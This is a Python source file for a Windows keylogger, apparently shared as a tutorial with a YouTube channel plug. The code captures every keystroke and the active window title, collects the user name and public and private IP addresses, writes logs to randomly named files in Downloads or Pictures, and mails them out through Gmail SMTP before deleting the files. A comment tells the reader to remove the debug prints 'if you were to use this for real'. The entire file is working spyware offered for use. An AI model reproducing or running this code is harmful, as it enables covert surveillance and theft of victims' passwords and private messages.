#//python keylogging program

## You will need to comment out the prints and exception prints on code if you were to use this for real, as its testing
## i have prints on here that will tell you and let you know what part of the program is going at the time and that it is 
## working 

# Surport me and subscribe to my YouTube tutorial channel - https://bit.ly/2U58Lt9 / link also in my description. Thanks.

#imports
from pynput.keyboard import Key,Listener
import win32gui
import os
import time
import requests
import socket
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import config


datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())

msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
logged_data = []
logged_data.append(msg)

old_app = ''
delete_file = []


def on_press(key):
	global old_app

	new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

	if new_app == 'Cortana':
		new_app = 'Windows Start Menu'
	else:
		pass
	
	
	if new_app != old_app and new_app != '':
		logged_data.append(f'[{datetime}] ~ {new_app}\n')
		old_app = new_app
	else:
		pass


	substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
	'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
	'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 
	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

	key = str(key).strip('\'')
	if key in substitution:
		logged_data.append(substitution[substitution.index(key)+1])
	else:
		logged_data.append(key)


def write_file(count):
	one = os.path.expanduser('~') + '/Downloads/'
	two = os.path.expanduser('~') + '/Pictures/'
	#three = 'C:/'
	list = [one,two]

	filepath = random.choice(list)
	filename = str(count) + 'I' + str(random.randint(1000000,9999999)) + '.txt'
	file = filepath + filename
	delete_file.append(file)


	with open(file,'w') as fp:
		fp.write(''.join(logged_data))
	print('written all good')


def send_logs():
	count = 0

	fromAddr = config.fromAddr
	fromPswd = config.fromPswd
	toAddr = fromAddr

	MIN = 10
	SECONDS = 60
	#time.sleep(MIN * SECONDS) # every 10 mins write file/send log
	time.sleep(30) # for debugging ~ yes program works :)
	while True:
		if len(logged_data) > 1:
			try:
				write_file(count)

				subject = f'[{user}] ~ {count}'

				msg = MIMEMultipart()
				msg['From'] = fromAddr
				msg['To'] = toAddr
				msg['Subject'] = subject
				body = 'testing'
				msg.attach(MIMEText(body,'plain'))

				attachment = open(delete_file[0],'rb')
				print('attachment')

				filename = delete_file[0].split('/')[2]

				part = MIMEBase('application','octect-stream')
				part.set_payload((attachment).read())
				encoders.encode_base64(part)
				part.add_header('content-disposition','attachment;filename='+str(filename))
				msg.attach(part)

				text = msg.as_string()
				print('test msg.as_string')

				s = smtplib.SMTP('smtp.gmail.com',587)
				s.ehlo()
				s.starttls()
				print('starttls')
				s.ehlo()
				s.login(fromAddr,fromPswd)
				s.sendmail(fromAddr,toAddr,text)
				print('sent mail')
				attachment.close()
				s.close()

				os.remove(delete_file[0])
				del logged_data[1:]
				del delete_file[0:]
				print('delete data/files')

				count += 1

			except Exception as errorString:
				print('[!] send_logs // Error.. ~ %s' % (errorString))
				pass




if __name__=='__main__':
	T1 = threading.Thread(target=send_logs)
	T1.start()

	with Listener(on_press=on_press) as listener:
		listener.join()

